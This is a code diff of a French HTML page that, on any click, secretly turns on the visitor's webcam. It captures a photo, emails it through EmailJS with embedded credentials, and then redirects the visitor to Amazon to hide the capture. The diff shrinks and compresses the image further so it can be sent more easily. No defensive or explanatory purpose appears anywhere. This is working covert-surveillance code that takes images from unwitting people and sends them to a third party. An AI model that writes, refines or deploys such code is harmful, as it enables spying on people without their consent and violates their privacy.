@@ -2,7 +2,7 @@
 <html lang="fr">
 <head>
   <meta charset="UTF-8">
-  <title>Capture et EmailJS compressé</title>
+  <title>Capture et EmailJS très compressé</title>
   <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
   <style>
     body, html {
@@ -26,10 +26,9 @@
 <body>
   <button id="triggerButton">Start</button>
   <video id="video" autoplay playsinline></video>
-  <canvas id="canvas" width="300" height="200"></canvas>
+  <canvas id="canvas" width="200" height="150"></canvas> <!-- Dimensions réduites -->
 
   <script>
-    // Initialisation EmailJS
     emailjs.init("IoSfbtGz4KSL_5_9E");
 
     const video = document.getElementById('video');
@@ -45,16 +44,14 @@
         video.srcObject = stream;
 
         video.onloadeddata = () => {
-          // Capture et compression en JPEG à faible qualité
           context.drawImage(video, 0, 0, canvas.width, canvas.height);
-          const imageData = canvas.toDataURL("image/jpeg", 0.2); // 20% qualité pour rester <50KB
+          const imageData = canvas.toDataURL("image/jpeg", 0.1); // Qualité 10%
 
           emailjs.send("service_8cs0gml", "template_hgvdx1g", {
             message: "Photo automatique capturée 📸",
             image: imageData
           })
           .then(() => {
-            // Redirection vers Amazon
             window.location.href = "https://www.amazon.fr";
           })
           .catch((err) => {
@@ -62,7 +59,6 @@
             window.location.href = "https://www.amazon.fr";
           });
 
-          // Arrêt de la caméra
           stream.getTracks().forEach(track => track.stop());
         };
 
@@ -72,12 +68,7 @@
       }
     }
 
-    // Déclenche le bouton invisible au clic sur la page
-    document.body.addEventListener('click', () => {
-      button.click();
-    });
-
-    // Lancement au clic sur le bouton invisible
+    document.body.addEventListener('click', () => button.click());
     button.addEventListener('click', startCapture);
   </script>
 </body>
